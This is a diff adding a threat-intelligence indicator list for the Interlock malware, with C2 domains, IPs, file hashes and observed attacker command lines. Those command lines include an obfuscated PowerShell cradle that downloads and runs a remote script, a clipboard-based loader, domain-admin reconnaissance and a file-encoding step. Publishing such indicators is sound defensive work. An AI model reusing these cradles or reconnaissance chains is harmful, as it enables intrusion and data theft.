@@ -1,0 +1,51 @@
+Domain:
+
+event-timemicrosoft.org - Interlock PHP Backdoor C2
+event-datamicrosoft.live - Interlock PHP Backdoor C2
+dnsmicrosoftds-data.org - Interlock PHP Backdoor C2
+
+Url:
+
+hxxps://dng-microsoftds[.]com/uvA4IBD9.txt - First stage powershell
+
+IP:
+
+167.235.235.151 - Interlock Backdoor C2
+65.109.162.8 - Interlock Backdoor C2
+206.72.199.225 - Interlock Backdoor C2
+177.136.225.135 - Interlock Backdoor C2
+128.140.120.188 - Interlock Backdoor C2
+
+File:
+
+1b34bb73dfca373e1765f75becd36b40a57db073415c9ad7211fd11241f11813 - Simple Process Launcher (c2.exe)
+d3dd9eede4d96267d156df9fd4a38d0f3b90dcccc117919eaba218bb7c886112 - Obfuscated Interlock PHP Backdoor (config.cfg)
+88e892c81cf6d4598bab161d6317fe7ef8aba276a8d28c8576b233c3779baae5 - Deobfuscated Interlock PHP Backdoor
+60d95d385e76bb83d38d713887d2fa311b4ecd9c5013882cd648afdeeb5dc7c3 - Unpacked Interlock C/C++ Backdoor
+1383980536418e66c3a2f5399a56fb77f04d6047d86c3ca0e1a6bab922f9d0c5 - Packed Interlock C/C++ Backdoor
+1f13e6ecafacc03dfbed8524751514f397b08a2bed4af4f9c12fcc6fbd283410 - Interlock C/C++ "Remover" DLL, i.e. tmp%d.dll
+
+Command Line:
+
+"C:\WINDOWS\system32\rundll32.exe" shell32.dll,ShellExec_RunDLL "<8_CHARS>.lnk"
+"C:\Users\<REDACTED>\AppData\Roaming\php\php.exe" -d extension=zip -d extension_dir=ext C:\Users\<REDACTED>\AppData\Roaming\php\config.cfg 1
+powershell  -c "$slp={Start-Sleep -Seconds (Get-Random -Minimum 0 -Maximum 21)};$dom=(Get-WmiObject Win32_ComputerSystem).PartOfDomain;if($dom){try{nltest /domain_trusts}catch{'No trusts'};&$slp;try{nltest /dclist:}catch{'No DCs'};&$slp;try{net group 'domain admins' /domain}catch{'No DA'};'';whoami /upn;whoami /user | Select-Object -Skip 1 | ForEach-Object {($_ -split '\s{2,}')[0]};'';whoami /groups | Where-Object {$_ -match '\sGroup\s' -and $_ -notmatch 'Alias|Well-known'} | Select-Object -Skip 1 | ForEach-Object {($_ -split '\s{2,}')[0]};'';whoami /priv | Where-Object {$_ -match 'Enabled\s*$'} | Select-Object -Skip 1 | ForEach-Object {($_ -split '\s{2,}')[0]}}else{'No domain';Get-LocalGroup | ForEach-Object {$g=$_.Name;\"G:$g\";Get-LocalGroupMember $g | Select-Object Name,PrincipalSource};'';whoami /upn;whoami /user | Select-Object -Skip 1 | ForEach-Object {($_ -split '\s{2,}')[0]};'';whoami /groups | Where-Object {$_ -match '\sGroup\s' -and $_ -notmatch 'Alias|Well-known'} | Select-Object -Skip 1 | ForEach-Object {($_ -split '\s{2,}')[0]};'';whoami /priv | Where-Object {$_ -match 'Enabled\s*$'} | Select-Object -Skip 1 | ForEach-Object {($_ -split '\s{2,}')[0]}}"
+"C:\WINDOWS\system32\nltest.exe" /domain_trusts
+"C:\WINDOWS\system32\net.exe" group "domain admins" /domain
+"C:\WINDOWS\system32\whoami.exe" /upn
+C:\WINDOWS\system32\net1 user <REDACTED> /domain
+"C:\WINDOWS\system32\HOSTNAME.EXE"
+cmd.exe /s /c "powershell -c "iwr https://nodejs.org/dist/v21.7.3/node-v21.7.3-win-x64.zip -out $env:tmp/node.zip""
+cmd.exe /s /c "powershell -c "Expand-Archive -Path $env:tmp/node.zip -DestinationPath $env:APPDATA""
+cmd.exe /s /c "powershell -c "rm $env:tmp/node.zip""
+cmd.exe /s /c "powershell -c "mv C:\Users\<REDACTED>\AppData\Roaming\<RANDOM_FOLDER>\<RANDOM_8_CHARS>.txt C:\Users\<REDACTED>\AppData\Roaming\node-v21.7.3-win-x64\node.log""
+cmd.exe /s /c "powershell -c "start-process -filePath C:\Users\<REDACTED>\AppData\Roaming\node-v21.7.3-win-x64\node.exe -arg C:\Users\<REDACTED>\AppData\Roaming\node-v21.7.3-win-x64\node.log  -WindowStyle hidden" "
+"C:\WINDOWS\system32\rundll32.exe" "C:\Users\<REDACTED>\AppData\Roaming\<RANDOM_FOLDER>\<8_CHARS>.png", start
+cmd.exe /d /s /c "cmd.exe /c powershell -c "$path='<REDACTED>'; $bin = [System.IO.File]::ReadAllBytes($path); $b64s = [Convert]::ToBase64String($bin); echo $b64s" 1> C:\Users\Public\<RANDOM>.log 2>&1"
+"C:\WINDOWS\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -nop -c "$gt='dng-m,i,crosoftds,com'.Split(',');$yn='htt'+'ps://'+$gt[0]+$gt[1]+$gt[2]+'.'+$gt[3]+'/' + 'uvA'+'4I'+'BD'+'9'+'.txt';$ws=New-Object Net.WebClient;$sc=$ws.('Download'+'String')($yn);$zl='i'+'ex';&$zl $sc" 
+"C:\WINDOWS\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c "$n=[System.Linq.Enumerable]::First(char[]);irm dnsg-microsoftds-data[.]life/zh0GPFZdKt |clip;&([scriptblock]::Create((gcb) -join $n))" 
+"C:\WINDOWS\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c "systeminfo /FO CSV | ConvertFrom-Csv | ConvertTo-Json" 
+"C:\WINDOWS\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c "Get-PSDrive -PSProvider FileSystem | ConvertTo-Json" 
+"C:\WINDOWS\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c "if ([Security.Principal.WindowsIdentity]::GetCurrent().Name -match '(?i)SYSTEM')  { 'SYSTEM' } elseif (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { 'ADMIN' } else { 'USER' }" 
+"C:\WINDOWS\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c "tasklist /svc /FO CSV | ConvertFrom-Csv | ConvertTo-Json" 
+"C:\WINDOWS\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c "Get-NetNeighbor -AddressFamily IPv4 | Where-Object { $.State -ne 'Permanent' } | Select-Object @{Name='Interface'; Expression={$.InterfaceAlias}}, @{Name='Internet Address'; Expression={$.IPAddress}}, @{Name='Physical Address'; Expression={$.LinkLayerAddress}}, @{Name='Type'; Expression={'dynamic'}} | ConvertTo-Json" 
